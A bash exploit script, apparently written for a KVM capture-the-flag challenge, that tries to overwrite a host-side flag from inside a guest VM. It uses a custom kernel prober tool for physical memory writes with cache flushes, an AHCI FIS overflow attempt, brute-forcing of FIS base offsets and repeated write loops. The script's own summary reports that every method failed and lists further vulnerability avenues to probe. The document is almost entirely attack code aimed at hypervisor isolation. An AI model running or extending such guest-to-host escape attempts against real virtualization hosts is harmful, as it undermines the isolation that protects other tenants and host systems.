#!/bin/bash
#
# KVM CTF Write Flag Exploit Script
# Attempts multiple methods to modify the host's write_flag
#

PROBER="./kvm_prober"
PATTERN="44434241efbeadde"  # Little-endian: 0xdeadbeef41424344

echo "=========================================="
echo "  KVM CTF Write Flag Exploit"
echo "=========================================="
echo

# Check if we're root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Need root privileges"
    exit 1
fi

# Check if driver is loaded
if [ ! -c /dev/kvm_probe_dev ]; then
    echo "[-] kvm_probe driver not loaded"
    exit 1
fi

# Check hypercall before
echo "[*] Initial hypercall 100 check..."
INITIAL=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-f]+')
echo "    Result: $INITIAL"

if [ "$INITIAL" != "0x0" ] && [ "$INITIAL" != "0xffffffffffffffff" ]; then
    echo "[!!!] Flag already retrieved: $INITIAL"
    exit 0
fi

echo

# Scan for pattern
echo "[*] Scanning for write_flag pattern..."
SCAN_RESULT=$($PROBER exploit_scan 0xffff888100000000 0xffff888180000000 2>/dev/null | grep "Found at")

if [ -z "$SCAN_RESULT" ]; then
    echo "[-] Pattern not found"
    exit 1
fi

PATTERN_ADDR=$(echo "$SCAN_RESULT" | grep -oP '0xffff888[0-9a-f]+' | head -1)
echo "[+] Found pattern at: $PATTERN_ADDR"

# Calculate GPA
GPA=$(printf "0x%x" $((PATTERN_ADDR - 0xffff888000000000)))
echo "[+] Guest Physical Address: $GPA"
echo

# Method 1: Direct write + cache flush
echo "=========================================="
echo "  Method 1: Write + WBINVD"
echo "=========================================="
echo "[*] Writing new value with cache flush..."
$PROBER write_flush $GPA 4141414141414141
echo "[*] Executing WBINVD..."
$PROBER wbinvd
echo "[*] Checking hypercall..."
RESULT=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-f]+')
echo "    Result: $RESULT"

if [ "$RESULT" != "0x0" ] && [ "$RESULT" != "0xffffffffffffffff" ]; then
    echo "[!!!] SUCCESS! Flag: $RESULT"
    exit 0
fi
echo

# Method 2: AHCI FIS manipulation
echo "=========================================="
echo "  Method 2: AHCI FIS Overflow"
echo "=========================================="
echo "[*] Getting AHCI info..."
$PROBER ahci_info

echo "[*] Attempting FIS overflow exploit..."
$PROBER ahci_exploit $GPA

echo "[*] Checking hypercall..."
RESULT=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-f]+')
echo "    Result: $RESULT"

if [ "$RESULT" != "0x0" ] && [ "$RESULT" != "0xffffffffffffffff" ]; then
    echo "[!!!] SUCCESS! Flag: $RESULT"
    exit 0
fi
echo

# Method 3: Try different FIS base offsets
echo "=========================================="
echo "  Method 3: FIS Base Offset Brute Force"
echo "=========================================="

for OFFSET in 0x00 0x20 0x40 0x58 0x60 0x80; do
    TARGET=$(printf "0x%x" $((GPA - OFFSET)))
    echo "[*] Trying FIS base $TARGET (offset -$OFFSET)..."
    $PROBER ahci_set_fb 0 $TARGET 2>/dev/null
    sleep 0.5
    
    RESULT=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-f]+')
    if [ "$RESULT" != "0x0" ] && [ "$RESULT" != "0xffffffffffffffff" ]; then
        echo "[!!!] SUCCESS at offset $OFFSET! Flag: $RESULT"
        exit 0
    fi
done
echo

# Method 4: Repeated write attempts
echo "=========================================="
echo "  Method 4: Rapid Write Loop"
echo "=========================================="
echo "[*] Writing repeatedly..."
for i in $(seq 1 10); do
    $PROBER write_phys_direct $GPA 4242424242424242 2>/dev/null
    $PROBER wbinvd 2>/dev/null
done

echo "[*] Checking hypercall..."
RESULT=$($PROBER hypercall 100 2>/dev/null | grep -oP '0x[0-9a-f]+')
echo "    Result: $RESULT"

if [ "$RESULT" != "0x0" ] && [ "$RESULT" != "0xffffffffffffffff" ]; then
    echo "[!!!] SUCCESS! Flag: $RESULT"
    exit 0
fi
echo

echo "=========================================="
echo "  Summary"
echo "=========================================="
echo "[-] All methods failed"
echo ""
echo "The pattern is found in guest memory but writes don't affect the host."
echo "This confirms Copy-on-Write is active."
echo ""
echo "Next steps:"
echo "  1. Investigate AHCI CVE-2021-3947 more deeply"
echo "  2. Check if virtio devices have similar vulnerabilities"
echo "  3. Look for memory slot misconfigurations in KVM"
echo ""
